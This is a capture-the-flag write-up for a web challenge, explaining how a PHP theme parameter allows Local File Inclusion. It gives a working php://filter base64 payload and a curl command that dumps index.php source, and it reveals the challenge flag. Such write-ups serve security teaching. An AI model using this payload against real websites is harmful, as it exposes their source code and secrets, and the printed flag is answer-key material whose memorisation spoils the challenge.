## CTF Writeup: Slopgamez (Web/LFI)

This challenge involves a common web vulnerability known as **Local File Inclusion (LFI)**, leveraged through a PHP filter to extract source code that is otherwise executed by the server.

---

### 1. Discovery

The challenge provides a URL with a query parameter: `[http://slopgamez.play.ctf.se:13337/index.php?theme=themes/dark](http://slopgamez.play.ctf.se:13337/index.php?theme=themes/dark)`

By observing how the page changes when the `theme` parameter is modified, it becomes clear that the PHP backend is likely using the `include()` or `require()` function to pull in files based on user input.

### 2. The Vulnerability: LFI

When a web application takes user input and passes it to a file system API without proper sanitization, an attacker can read sensitive files on the server. In this case, we want to see the source code of `index.php` to find the flag.

However, a standard LFI like `?theme=index.php` would simply cause the server to execute the PHP code again, displaying the rendered HTML rather than the raw code containing the flag.

### 3. The Exploit: PHP Filters

To bypass execution and read the raw source code, we use **PHP Wrappers**. Specifically, the `php://filter` wrapper allows us to apply a transformation (like Base64 encoding) to the file content before it is processed by the `include` function.

**The Payload:** `php://filter/convert.base64-encode/resource=index.php`

### 4. Execution

Running the following command retrieves the Base64 encoded source of the page:

Bash

```
curl -s "http://slopgamez.play.ctf.se:13337/index.php?theme=php://filter/convert.base64-encode/resource=index.php"
```

The server returns a large block of Base64 text. Decoding the first portion of that string reveals the PHP source:

PHP

```
<?php
    // FLAG: midnight{w4ch00_t4lk1ng_4b0ut_w1ll1s}

    if (empty($_REQUEST['theme'])){
        header('Location: index.php?theme=themes/dark');
        exit(0);
    }
?>
```

---

### 5. Conclusion

The flag was hidden inside a PHP comment at the top of the `index.php` file. By using the `php://filter` wrapper, we successfully bypassed the server's execution of the script and read its contents directly.

**Flag:** `midnight{w4ch00_t4lk1ng_4b0ut_w1ll1s}`
